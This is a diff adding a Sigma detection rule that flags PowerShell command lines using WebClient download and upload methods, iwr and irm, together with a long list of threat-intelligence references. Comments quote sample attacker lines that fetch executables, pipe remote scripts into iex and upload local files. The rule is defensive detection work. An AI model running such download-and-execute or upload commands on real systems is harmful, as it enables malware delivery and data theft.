@@ -1,0 +1,404 @@
+id: D5KpI6v7e2Si
+name: Download or Upload via Powershell (via cmdline)
+body: |-
+  title: Download or Upload via Powershell (via cmdline)
+  id: 69b6437e-cee7-4b31-a02b-537356cff33d
+  status: stable
+  description: By leveraging a combination of indicators, the rule aims to flag instances where possible malicious actors may be attempting to download malicious content (as like next stage of malware) or upload confidential data (through the use of automated processing after being gathered during Collection tactic) via PowerShell. For instance, it targets specific PowerShell methods such as DownloadString, UploadData, etc. which are commonly associated with downloading or uploading activities in malicious scripts or hands-on post-exploitation actions. The reliance on the surrounding environment may necessitate the implementation of additional filtering (for legitimate administrative scripts and processes) measures to prevent false positives.
+  references:
+      - https://www.security.com/threat-intelligence/openai-claude-unauthorized-relays
+      - https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware
+      - https://socradar.io/blog/inc-gentlemen-ransomware-ai-infrastructure/
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa26-281a
+      - https://www.security.com/threat-intelligence/warlock-ransomware-critical-infrastructure
+      - https://www.microsoft.com/en-us/security/blog/2026/09/29/phishing-abuses-rmm-tools-persistent-access/
+      - https://www.huntress.com/blog/threat-actor-compiles-cryptominer
+      - https://www.microsoft.com/en-us/security/blog/2026/09/02/impersonating-it-support-threat-actors-turn-remote-session-into-enterprise-wide-access/
+      - https://asec.ahnlab.com/en/95516/
+      - https://www.zscaler.com/blogs/security-research/operation-rapidrust-apt36-deploys-rustyshade-rustymove-psnatch-and
+      - https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware
+      - https://www.rstcloud.com/ftp-banner-dead-drops-a-hunters-field-guide-to-e4del-and-pinhole/
+      - https://asec.ahnlab.com/en/95230/
+      - https://fieldeffect.com/blog/clickfix-cluster-observed-activity-recent-campaigns
+      - https://www.esentire.com/blog/malware-as-a-service-cocktail-errtraffic-and-cruciferra-killing-your-edr-since-2025
+      - https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing/
+      - https://asec.ahnlab.com/en/94995/
+      - https://asec.ahnlab.com/ko/94695/
+      - https://www.securonix.com/blog/smoke-screen-screenconnect-rmm-abuse-cloudflare-tunnels/
+      - https://asec.ahnlab.com/en/94685/
+      - https://www.zscaler.com/blogs/security-research/helpdesk-hijackers-teams-vishing-quick-assist-and-gogrpc-backdoor
+      - https://zerobec.com/blog/operation-bluedash-multi-rmm-workplace-phishing
+      - https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
+      - https://www.bleepingcomputer.com/news/security/steam-forum-clickfix-attacks-infect-gamers-with-xmrig-cryptominers/
+      - https://www.jumpsec.com/guides/inside-a-dprk-bluenoroff-clickfix-kit/
+      - https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/
+      - https://meltedinhex.com/posts/clickfix-errtraffic-blockchain-c2/
+      - https://www.esentire.com/blog/dindoor-denorat-and-nightshadec2-analyzing-tag-150s-evolving-tradecraft
+      - https://www.huntress.com/blog/sql-injection-attacker-persistence
+      - https://www.seqrite.com/blog/operation-shadowrecruit-a-recruitment-themed-malware-campaign-leveraging-controlr-and-google-sheets-to-target-indian-job-seekers/
+      - https://www.picussecurity.com/resource/blog/gamaredon-primitive-bear-apt-profile-and-mitre-attck-breakdown
+      - https://any.run/cybersecurity-blog/banana-rat-evolution-analysis/
+      - https://www.microsoft.com/en-us/security/blog/2026/06/24/stealc-and-amadey-breaking-down-infostealers-and-the-cybercrime-services-that-deliver-them/
+      - https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline
+      - https://www.seqrite.com/blog/threat-actors-weaponizing-rar-archives-to-target-thailands-healthcare-sector/
+      - https://www.threatdown.com/blog/prinz-eugen-ransomware-a-deep-dive-into-a-new-go-based-encryptor/
+      - https://www.elastic.co/security-labs/oxloader-malware-loader-infostealer
+      - https://www.zscaler.com/blogs/security-research/clickfix-campaign-generated-ai-delivers-smartrat
+      - https://socket.dev/blog/glasswasm-malware-open-vsx-extensions?utm_medium=feed
+      - https://www.ibm.com/think/x-force/interlock-and-rhysida-within-the-ransonware-ecosystem
+      - https://www.silentpush.com/blog/drivesurge/
+      - https://www.malwarebytes.com/blog/bugs/2026/05/700-education-and-tech-websites-hijacked-in-huge-clickfix-malware-campaign
+      - https://www.bitdefender.com/en-us/blog/labs/microsofts-mshta-legacy-malware-windows
+      - https://blog.eclecticiq.com/seo-poisoning-campaign-leverages-gemini-and-claude-code-impersonation-to-deliver-infostealer
+      - https://www.picussecurity.com/resource/blog/deepload-malware-explained-clickfix-delivery-and-password-stealing
+      - https://www.security.com/threat-intelligence/iran-seedworm-electronics
+      - https://thehackernews.com/2026/05/daemon-tools-supply-chain-attack.html
+      - https://www.validin.com/blog/i_cant_hear_you_unc1069/
+      - https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/
+      - https://hunt.io/blog/iranian-nexus-oman-government-intrusion
+      - https://blog.talosintelligence.com/cloudz-pheno-infostealer/
+      - https://www.huntress.com/blog/komari-c2-agent-abuse
+      - https://www.trellix.com/blogs/research/purerat-fileless-utilizing-steganography-process-hollowing/
+      - https://www.stormshield.com/news/analyzing-full-clickfix-attack-chain-part1/
+      - https://cert.gov.ua/article/6288271
+      - https://www.elastic.co/security-labs/phantom-in-the-vault
+      - https://www.netskope.com/blog/from-clickfix-to-maas-exposing-a-modular-windows-rat-and-its-admin-panel
+      - https://asec.ahnlab.com/en/93151/
+      - https://www.fortinet.com/blog/threat-research/dprk-related-campaigns-with-lnk-and-github-c2
+      - https://www.bitsight.com/blog/ransomware-twizt-inside-phorpiex-botnet
+      - https://www.microsoft.com/en-us/security/blog/2026/03/03/signed-malware-impersonating-workplace-apps-deploys-rmm-backdoors
+      - https://redcanary.com/blog/threat-intelligence/mocha-manakin-nodejs-backdoor/
+      - https://www.elastic.co/security-labs/a-wretch-client
+      - https://cert.gov.ua/article/6282902
+      - https://cert.gov.ua/article/6282517
+      - https://cert.gov.ua/article/6281681
+      - https://cert.gov.ua/article/6281123
+      - https://cert.gov.ua/article/6281095
+      - https://www.attackiq.com/2024/10/17/response-to-cisa-advisory-aa24-290a/
+      - https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-290a
+      - https://harfanglab.io/insidethelab/hijackloader-abusing-genuine-certificates/
+      - https://intezer.com/blog/research/cryptbot-yet-another-silly-stealer-yass/
+      - https://cert.gov.ua/article/6280422
+      - https://www.trendmicro.com/en_us/research/24/g/CVE-2024-38112-void-banshee.html
+      - https://tria.ge/240710-1e56ma1ekl/behavioral1 #irm
+      - https://unit42.paloaltonetworks.com/darkgate-malware-uses-excel-files/
+      - https://blogs.jpcert.or.jp/en/2024/07/attack-activities-by-kimsuky-targeting-japanese-organizations.html
+      - https://redcanary.com/blog/cve-2023-48788/
+      - https://research.checkpoint.com/2024/magnet-goblin-targets-publicly-facing-servers-using-1-day-vulnerabilities/
+      - https://www.infosecurity-magazine.com/news/signature-techniques-of-asian-apt/
+      - https://www.rapid7.com/blog/post/2023/11/06/etr-rapid7-observed-exploitation-of-atlassian-confluence-cve-2023-22518/
+      - https://www.securonix.com/blog/threat-labs-security-advisory-new-starkvortex-attack-campaign-threat-actors-use-drone-manual-lures-to-deliver-merlinagent-payloads/
+      - https://medium.com/@knownsec404team/suspected-apt37-new-attack-weapon-fakecheck-analysis-report-c54a6991dd46
+      - https://cert.gov.ua/article/5628441
+      - https://nao-sec.org/2023/08/groundpeony-crawling-with-malice.html
+      - https://unit42.paloaltonetworks.com/nodestealer-2-targets-facebook-business/
+      - https://unit42.paloaltonetworks.com/mallox-ransomware/
+      - https://cert.gov.ua/article/5213167
+      - https://cert.gov.ua/article/5158006
+      - https://gi7w0rm.medium.com/cloudeye-from-lnk-to-shellcode-4b5f1d6d877
+      - https://asec.ahnlab.com/en/55145/
+      - https://www.securonix.com/securonix-threat-labs-security-advisory-multistorm-leverages-python-based-loader-as-onedrive-utilities-to-drop-rat-payloads/
+      - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-russia-ukraine-military
+      - https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/
+      - https://cert.gov.ua/article/4818341
+      - https://cert.gov.ua/article/4755642
+      - https://www.securonix.com/blog/securonix-threat-labs-security-meme4chan-advisory/
+      - https://asec.ahnlab.com/ko/52662/
+      - https://cert.gov.ua/article/4492467
+      - https://cert.gov.ua/article/3761023
+      - https://cert.gov.ua/article/971405
+      - https://inquest.net/blog/2022/07/25/convoluted-infection-chain-using-excel
+      - https://cert.gov.ua/article/405538
+      - https://cert.gov.ua/article/341128
+      - https://cert.gov.ua/article/39138
+      - https://www.trendmicro.com/en_us/research/21/l/collecting-in-the-dark-tropic-trooper-targets-transportation-and-government-organizations.html
+      - https://app.any.run/tasks/7549614c-9784-4a71-83b8-9b9bbc2a4eb4/
+      - https://app.any.run/tasks/400c9606-246a-465b-a80a-92bc0c70e87a/
+      - https://blog.talosintelligence.com/new-horabot-targets-americas/
+      - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/
+      - https://www.zscaler.com/blogs/security-research/steal-it-campaign
+      - https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/
+      - https://unit42.paloaltonetworks.com/alloy-taurus-targets-se-asian-government/
+      - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/agent-teslas-unique-approach-vbs-and-steganography-for-delivery-and-intrusion/
+      - https://asec.ahnlab.com/en/57873/
+      - https://blogs.vmware.com/security/2023/11/netsupport-rat-the-rat-king-returns.html
+      - https://www.arcticwolf.com/resources/blog/qlik-sense-exploited-in-cactus-ransomware-campaign/
+      - https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/
+      - https://blog.talosintelligence.com/lazarus_new_rats_dlang_and_telegram/
+      - https://www.imperva.com/blog/imperva-detects-undocumented-8220-gang-activities/
+      - https://www.seqrite.com/blog/operation-rusticweb-targets-indian-govt-from-rust-based-malware-to-web-service-exfiltration/
+      - https://www.deepinstinct.com/blog/threat-actor-uac-0099-continues-to-target-ukraine
+      - https://www.securonix.com/blog/securonix-threat-research-security-advisory-new-returgence-attack-campaign-turkish-hackers-target-mssql-servers-to-deliver-domain-wide-mimic-ransomware/
+      - https://www.trendmicro.com/en_us/research/24/a/cve-2023-36025-exploited-for-defense-evasion-in-phemedrone-steal.html
+      - https://www.rapid7.com/blog/post/2024/01/17/whispers-of-atlantida-safeguarding-your-digital-treasure/
+      - https://asec.ahnlab.com/en/60805/
+      - https://medium.com/@knownsec404team/apt-k-47-organization-launches-espionage-attacks-using-a-new-trojan-tool-5e7eccfdce2f
+      - https://www.trustwave.com/hubfs/Web/Library/Documents_pdf/FaceBook_Ad_Spreads_Novel_Malware.pdf
+      - https://www.reliaquest.com/blog/new-python-socgholish-infection-chain/
+      - https://www.trendmicro.com/en_us/research/24/b/earth-preta-campaign-targets-asia-doplugs.html
+      - https://news.sophos.com/en-us/2024/02/23/connectwise-screenconnect-attacks-deliver-malware/
+      - https://thedfirreport.com/2024/02/26/seo-poisoning-to-domain-control-the-gootloader-saga-continues/
+      - https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708
+      - https://www.trendmicro.com/en_us/research/24/c/teamcity-vulnerability-exploits-lead-to-jasmin-ransomware.html
+      - https://labs.k7computing.com/index.php/unknown-ttps-of-remcos-rat/
+      - https://www.trendmicro.com/en_us/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html
+      - https://thedfirreport.com/2024/04/01/from-onenote-to-ransomnote-an-ice-cold-intrusion/
+      - https://asec.ahnlab.com/ko/63614/
+      - https://www.esentire.com/blog/unraveling-not-azorult-but-koi-loader-a-precursor-to-koi-stealer
+      - https://decoded.avast.io/janrubin/guptiminer-hijacking-antivirus-updates-for-distributing-backdoors-and-casual-mining/
+      - https://www.securonix.com/blog/securonix-threat-research-security-advisory-frozenshadow-attack-campaign/
+      - https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/
+      - https://asec.ahnlab.com/ko/65307/
+      - https://www.esentire.com/blog/socgholish-sets-sights-on-victim-peers
+      - https://research.checkpoint.com/2024/foxit-pdf-flawed-design-exploitation/
+      - https://www.elastic.co/security-labs/invisible-miners-unveiling-ghostengine
+      - https://asec.ahnlab.com/ko/65918/
+      - https://www.trendmicro.com/en_us/research/24/e/decoding-8220-latest-obfuscation-tricks.html
+      - https://thedfirreport.com/2024/06/10/icedid-brings-screenconnect-and-csharp-streamer-to-alphv-ransomware-deployment/
+      - https://asec.ahnlab.com/ko/66581/
+      - https://asec.ahnlab.com/en/66720/
+      - https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn
+      - https://www.splunk.com/en_us/blog/security/lnk-phishing-analysis-simulation.html
+      - https://thorcert.notion.site/TTPs-11-Operation-An-Octopus-d875862055ca4b7b815b5e496b219671
+      - https://cyble.com/blog/new-malware-campaign-abusing-rdpwrapper-and-tailscale-to-target-cryptocurrency-users/
+      - https://labs.k7computing.com/index.php/echoes-of-braodo-tales-from-the-cyber-underworld/
+      - https://www.attackiq.com/2024/07/26/response-to-cisa-advisory-aa24-207a/
+      - https://research.checkpoint.com/2024/stargazers-ghost-network/
+      - https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/
+      - https://www.proofpoint.com/us/blog/threat-insight/threat-actor-abuses-cloudflare-tunnels-deliver-rats
+      - https://www.attackiq.com/2024/08/30/emulating-mallox-ransomware/
+      - https://www.trendmicro.com/en_us/research/24/i/whatsup-gold-rce.html
+      - https://www.trendmicro.com/en_us/research/24/i/earth-baxia-spear-phishing-and-geoserver-exploit.html
+      - https://unit42.paloaltonetworks.com/snipbot-romcom-malware-variant/
+      - https://www.forcepoint.com/blog/x-labs/inside-latrodectus-malware-phishing-campaign
+      - https://cert.gov.ua/article/6281632
+      - https://www.trendmicro.com/en_us/research/24/l/darkgate-malware.html
+      - https://www.attackiq.com/2024/12/12/emulating-fin7-part-1/
+      - https://www.attackiq.com/2025/01/27/emulating-the-splintered-hunters/
+      - https://unit42.paloaltonetworks.com/espionage-campaign-targets-south-asian-entities/
+      - https://www.cybereason.com/blog/threat-analysis-phorpiex-downloader
+      - https://www.fortinet.com/blog/threat-research/coyote-banking-trojan-a-stealthy-attack-via-lnk-files
+      - https://www.forcepoint.com/blog/x-labs/asyncrat-reloaded-python-trycloudflare-malware
+      - https://www.microsoft.com/en-us/security/blog/2025/02/12/the-badpilot-campaign-seashell-blizzard-subgroup-conducts-multiyear-global-access-operation/
+      - https://medium.com/@rayssac/infostealer-malware-linked-to-lazarus-group-campaigns-a510ad5f3e4f
+      - https://www.attackiq.com/2025/02/14/emulating-fin7-part-2/
+      - https://www.attackiq.com/2025/02/26/emulating-akira-ransomware/
+      - https://www.bridewell.com/insights/blogs/detail/who-are-hellcat-ransomware-group
+      - https://www.fortinet.com/blog/threat-research/havoc-sharepoint-with-microsoft-graph-api-turns-into-fud-c2
+      - https://www.splunk.com/en_us/blog/security/infostealer-campaign-against-isps.html
+      - https://www.attackiq.com/2025/03/06/emulating-ransomhub/
+      - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/a-deep-dive-into-strela-stealer-and-how-it-targets-european-countries/
+      - https://catalyst.prodaft.com/public/report/ragnar-loader/overview
+      - https://www.trendmicro.com/en_us/research/25/c/socgholishs-intrusion-techniques-facilitate-distribution-of-rans.html
+      - https://blog.sekoia.io/clearfakes-new-widespread-variant-increased-web3-exploitation-for-malware-delivery/
+      - https://www.welivesecurity.com/en/eset-research/operation-fishmedley/
+      - https://www.esentire.com/blog/the-long-and-shortcut-of-it-koiloader-analysis
+      - https://blog.talosintelligence.com/gamaredon-campaign-distribute-remcos/
+      - https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel
+      - https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild
+      - https://blog.talosintelligence.com/introducing-toymaker-an-initial-access-broker/
+      - https://www.seqrite.com/blog/threat-actors-are-targeting-us-tax-session-with-new-tactics-of-stealerium-infostealer/
+      - https://www.fortinet.com/blog/threat-research/fortiguard-incident-response-team-detects-intrusion-into-middle-east-critical-national-infrastructure
+      - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/yet-another-nodejs-backdoor-yanb-a-modern-challenge/
+      - https://unit42.paloaltonetworks.com/lampion-malware-clickfix-lures/
+      - https://www.picussecurity.com/resource/blog/dragonforce-ransomware-attacks-retail-giants
+      - https://www.picussecurity.com/resource/blog/lumma-infostealer-continues-its-github-social-engineering-campaign
+      - https://www.attackiq.com/2025/05/08/emulating-termite-ransomware/
+      - https://news.sophos.com/en-us/2025/05/09/lumma-stealer-coming-and-going/
+      - https://blog.qualys.com/vulnerabilities-threat-research/2025/05/15/fileless-execution-powershell-based-shellcode-loader-executes-remcos-rat
+      - https://www.trendmicro.com/en_us/research/25/e/tiktok-videos-infostealers.html
+      - https://blog.talosintelligence.com/uat-6382-exploits-cityworks-vulnerability/
+      - https://www.attackiq.com/2025/05/23/emulating-dragonforce-ransomware/
+      - https://www.sentinelone.com/blog/how-clickfix-is-weaponizing-verification-fatigue-to-deliver-rats-infostealers/
+      - https://www.trellix.com/blogs/research/cfo-spear-phishing-netbird-attack/
+      - https://www.elastic.co/security-labs/eddiestealer
+      - https://www.malwarebytes.com/blog/news/2025/06/victims-risk-asyncrat-infection-after-being-redirected-to-fake-booking-sites
+      - https://www.ibm.com/think/x-force/dcrat-presence-growing-in-latin-america
+      - https://labs.k7computing.com/index.php/a-soraai-clickbait/
+      - https://unit42.paloaltonetworks.com/blitz-malware-2025/
+      - https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
+      - https://blog.talosintelligence.com/python-version-of-golangghost-rat/
+      - https://www.gdatasoftware.com/blog/2025/07/38228-monero-malware-xmrig-resurgence
+      - https://www.cybereason.com/blog/blacksuit-data-exfil
+      - https://thedfirreport.com/2025/07/14/kongtuke-filefix-leads-to-new-interlock-rat-variant/
+      - https://www.nccgroup.com/us/research-blog/fake-captcha-led-to-lumma100725/
+      - https://arcticwolf.com/resources/blog/dropping-elephant-apt-group-targets-turkish-defense-industry/
+      - https://catalyst.prodaft.com/public/report/understanding-current-castleloader-campaigns/overview
+      - https://www.trellix.com/blogs/research/a-deep-dive-into-obj3ctivitystealers-features/
+      - https://www.nccgroup.com/research-blog/rapid-breach-social-engineering-to-remote-access-in-300-seconds/
+      - https://arcticwolf.com/resources/blog/threat-actor-profile-interlock-ransomware/
+      - https://blog.talosintelligence.com/uat-7237-targets-web-hosting-infra/
+      - https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/
+      - https://www.trellix.com/blogs/research/xworms-evolving-infection-chain-from-predictable-to-deceptive/
+      - https://research.checkpoint.com/2025/yurei-the-ghost-of-open-source-ransomware/
+      - https://www.zscaler.com/blogs/security-research/coldriver-updates-arsenal-baitswitch-and-simplefix
+      - https://labs.k7computing.com/index.php/breakingdown-of-patchwork-apt/
+      - https://arcticwolf.com/resources/blog/smash-and-grab-aggressive-akira-campaign-targets-sonicwall-vpns/
+      - https://www.huntress.com/blog/dont-sweat-clickfix-techniques
+      - https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability
+      - https://asec.ahnlab.com/ko/90717/
+      - https://www.esentire.com/blog/unpacking-netsupport-rat-loaders-delivered-via-clickfix
+      - https://www.bitsight.com/blog/brazil-love-new-tactics-lampion
+      - https://www.trendmicro.com/en_us/research/25/j/active-water-saci-campaign-whatsapp-update.html
+      - https://www.picussecurity.com/resource/blog/prophet-spider-threat-actor-explained
+      - https://blog.sekoia.io/phishing-campaigns-i-paid-twice-targeting-booking-com-hotels-and-customers/
+      - https://www.picussecurity.com/resource/blog/xhunt-apt-cyber-espionage-operations-targeting-kuwait-and-exchange-servers
+      - https://cloud.google.com/blog/topics/threat-intelligence/triofox-vulnerability-cve-2025-12480/
+      - https://www.esentire.com/blog/evalusion-campaign-delivers-amatera-stealer-and-netsupport-rat
+      - https://www.trendmicro.com/en_us/research/25/k/lumma-stealer-browser-fingerprinting.html
+      - https://www.cyberproof.com/blog/maverick-and-coyote-analyzing-the-link-between-two-evolving-brazilian-banking-trojans/
+      - https://labs.k7computing.com/index.php/brazilian-campaign-spreading-the-malware-via-whatsapp/
+      - https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/spiderlabs-ids-new-banking-trojan-distributed-through-whatsapp/
+      - https://asec.ahnlab.com/en/91166/
+      - https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps
+      - https://arcticwolf.com/resources/blog/romcom-utilizing-socgholish-to-deliver-mythic-agent-to-usa-companies-supporting-ukraine/
+      - https://about.gitlab.com/blog/gitlab-discovers-widespread-npm-supply-chain-attack/
+      - https://www.sentinelone.com/blog/defending-against-sha1-hulud-the-second-coming/
+      - https://news.sophos.com/en-us/2025/11/20/whatsapp-compromise-leads-to-astaroth-deployment/
+      - https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
+      - https://www.trendmicro.com/en_us/research/25/k/shai-hulud-2-0-targets-cloud-and-developer-systems.html
+      - https://www.greynoise.io/blog/cve-2025-55182-react2shell-opportunistic-exploitation-in-the-wild-what-the-greynoise-observation-grid-is-seeing-so-far
+      - https://news.sophos.com/en-us/2025/12/11/gold-salem-tradecraft-for-deploying-warlock-ransomware/
+      - https://asec.ahnlab.com/ko/91678/
+      - https://www.huntress.com/blog/active-exploitation-gladinet-centrestack-triofox-insecure-cryptography-vulnerability
+      - https://www.securonix.com/blog/analyzing-phaltblyx-how-fake-bsods-and-trusted-build-tools-are-used-to-construct-a-malware-infection/
+      - https://www.trendmicro.com/en_us/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html
+      - https://www.picussecurity.com/resource/blog/how-wannamine-works-a-fileless-cryptominer-malware
+      - https://www.huntress.com/blog/malicious-browser-extention-crashfix-kongtuke
+      - https://www.bleepingcomputer.com/news/security/clickfix-attack-uses-fake-windows-bsod-screens-to-push-malware/
+      - https://www.trendmicro.com/en_us/research/26/a/watering-hole-attack-targets-emeditor-users.html
+      - https://www.bleepingcomputer.com/news/security/clickfix-attack-uses-fake-windows-bsod-screens-to-push-malware/
+      - https://censys.com/blog/living-off-the-web-how-trust-infrastructure-became-a-malware-delivery-interface
+      - https://www.aikido.dev/blog/fake-clawdbot-vscode-extension-malware
+      - https://www.zscaler.com/blogs/security-research/apt-attacks-target-indian-government-using-sheetcreep-firepower-and
+      - https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/
+      - https://blog.talosintelligence.com/uat-8099-new-persistence-mechanisms-and-regional-focus/
+      - https://www.fortinet.com/blog/threat-research/interlock-ransomware-new-techniques-same-old-tricks
+      - https://blog.pulsedive.com/tamecat-analysis-of-an-iranian-powershell-based-backdoor/
+      - https://censys.com/blog/voicemail-trap-german-language-voicemail-lure-remote-access
+      - https://isc.sans.edu/diary/rss/32682
+      - https://research.checkpoint.com/2026/amaranth-dragon-weaponizes-cve-2025-8088-for-targeted-espionage/
+      - https://www.zscaler.com/blogs/security-research/technical-analysis-marco-stealer
+      - https://www.microsoft.com/en-us/security/blog/2026/02/05/clickfix-variant-crashfix-deploying-python-rat-trojan/
+      - https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399
+      - https://www.esentire.com/blog/tenant-from-hell-prometeis-unauthorized-stay-in-your-windows-server
+      - https://www.forcepoint.com/blog/x-labs/phorpiex-global-group-ransomware-lnk-phishing
+      - https://www.huntress.com/blog/employee-monitoring-simplehelp-abused-in-ransomware-operations
+      - https://www.forcepoint.com/blog/x-labs/screenconnect-attack
+      - https://www.levelblue.com/blogs/spiderlabs-blog/how-clickfix-opens-the-door-to-stealthy-stealc-information-stealer
+      - https://www.proofpoint.com/us/blog/threat-insight/dont-trustconnect-its-a-rat
+      - https://blog.talosintelligence.com/new-dohdoor-malware-campaign/
+      - https://blog.deception.pro/blog/clickfix-hok-velvet-tempest-termite
+      - https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492v
+      - https://ctrlaltintel.com/threat%20research/MuddyWater/
+      - https://www.picussecurity.com/resource/blog/t1059-001-powershell
+      - https://www.trendmicro.com/en_us/research/26/c/boryptgrab-stealer-targets-users-via-deceptive-github-pages.html
+      - https://www.trendmicro.com/en_us/research/26/c/kongtuke-clickfix-abuse-of-compromised-wordpress-sites.html
+      - https://www.rapid7.com/blog/post/tr-malicious-websites-wordpress-compromise-advances-global-stealer-operation/
+      - https://www.sonicwall.com/blog/pdf-borne-living-off-the-land-attacks-with-rmm-abuse
+      - https://www.seqrite.com/blog/operation-camelclone-multi-region-espionage-campaign-targets-government-and-defense-entities-amidst-regional-tensions/
+      - https://zenox.ai/en/venon-the-first-brazilian-banker-rat-in-rust/
+      - https://www.genians.co.kr/en/blog/threat_intelligence/kakaotalk
+      - https://www.pointwild.com/threat-intelligence/covert-rat-phishing-campaign/
+      - https://sect.iij.ad.jp/blog/2026/03/dropbox-api-kimsuky-malware/
+      - https://www.catonetworks.com/blog/cato-ctrl-vishing-and-microsoft-teams-used-deliver-phantombackdoor/
+      - https://www.recordedfuture.com/research/clickfix-campaigns-targeting-windows-and-macos
+      - https://www.mcafee.com/blogs/other-blogs/mcafee-labs/ai-written-malware-vibe-coded-campaign/
+      - https://labs.k7computing.com/index.php/resoker-a-telegram-based-remote-access-trojan/
+      - https://reliaquest.com/blog/threat-spotlight-deepload-malware-pairs-clickfix-delivery-with-ai-generated-evasion/
+  tags:
+      - attack.execution
+      - attack.t1059.001
+      - attack.command_and_control
+      - attack.t1105
+      - attack.exfiltration
+      - attack.t1020
+      - attack.t1204.004
+  author: SOC Prime Team
+  logsource:
+      category: process_creation
+      product: windows
+  detection:
+      selection_bin:
+          Image|endswith: '.exe'
+      selection1:
+          CommandLine|contains|all:
+              - 'Web' #$v1='Net.We'; $v2='bClient'; $var = (New-Object $v1$v2)
+              - 'Client'
+              - 'New-Object'
+      selection2:
+          CommandLine|contains:
+              - '.DownloadData' #https://cert.gov.ua/article/6281681; https://blog.deception.pro/blog/clickfix-hok-velvet-tempest-termite; https://www.esentire.com/blog/malware-as-a-service-cocktail-errtraffic-and-cruciferra-killing-your-edr-since-2025
+              - '.DownloadString' #https://cert.gov.ua/article/6282902; https://asec.ahnlab.com/en/91166/; https://detect.fyi/playbook-hunting-chinese-apt-379a6b950492; https://hunt.io/blog/iranian-nexus-oman-government-intrusion; https://www.security.com/threat-intelligence/iran-seedworm-electronics; https://www.picussecurity.com/resource/blog/handala-threat-group-tactics-targets-and-attack-timeline; https://www.zscaler.com/blogs/security-research/seo-poisoning-campaign-delivers-new-armorsteal-malware
+              - '.DownloadFile' #https://www.picussecurity.com/resource/blog/xhunt-apt-cyber-espionage-operations-targeting-kuwait-and-exchange-servers; # https://www.pointwild.com/threat-intelligence/covert-rat-phishing-campaign/; https://www.bitsight.com/blog/ransomware-twizt-inside-phorpiex-botnet; https://thehackernews.com/2026/05/daemon-tools-supply-chain-attack.html; https://asec.ahnlab.com/en/94685/; https://www.securonix.com/blog/smoke-screen-screenconnect-rmm-abuse-cloudflare-tunnels/; https://www.rstcloud.com/ftp-banner-dead-drops-a-hunters-field-guide-to-e4del-and-pinhole/
+              - '.UploadString'
+              - '.uploaddata' #..net.webclient;$ujk.uploaddata('http:/...
+              - '.UriBuilder' #..system.UriBuilder('ab://' + '{url_to_powershell_script}'..
+              - '.UploadFile' #wc.UploadFile("http://127.0.0.1:5000/success","C:\Users\K3vin\Downloads\log.txt"); https://ctrlaltintel.com/threat%20research/MuddyWater/
+      selection3:
+          - CommandLine|contains|all:
+              #- 'powershell'
+              - 'iwr ' #...iwr http://xxx.pl/grafika/docx.exe -OutFile "C:\Users\$ENV:UserName\docx.exe";...'; https://cert.gov.ua/article/6282902; https://www.picussecurity.com/resource/blog/fog-ransomware-2025-deep-dive-into-ttps; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/; https://www.trendmicro.com/en_us/research/26/a/analyzing-a-a-multi-stage-asyncrat-campaign-via-mdr.html; https://blog.sekoia.io/meet-iclickfix-a-widespread-wordpress-targeting-framework-using-the-clickfix-tactic/; https://www.elastic.co/security-labs/phantom-in-the-vault; https://arcticwolf.com/resources/blog/bluenoroff-uses-clickfix-fileless-powershell-and-ai-generated-zoom-meetings-to-target-web3-sector/; https://asec.ahnlab.com/en/94995/; https://www.elastic.co/security-labs/threat-command/malicious-browser-extension-kremlin-banking-malware; https://asec.ahnlab.com/en/95516/
+              - 'http'
+          - CommandLine|contains|all:
+              #- 'powershell'
+              - 'irm ' #invoke rest method powershell -c "irm bun.sh/install.ps1|iex"; https://www.acronis.com/en/tru/posts/fake-adult-websites-pop-realistic-windows-update-screen-to-deliver-stealers-via-clickfix/
+              - 'http'
+          - CommandLine|contains|all:
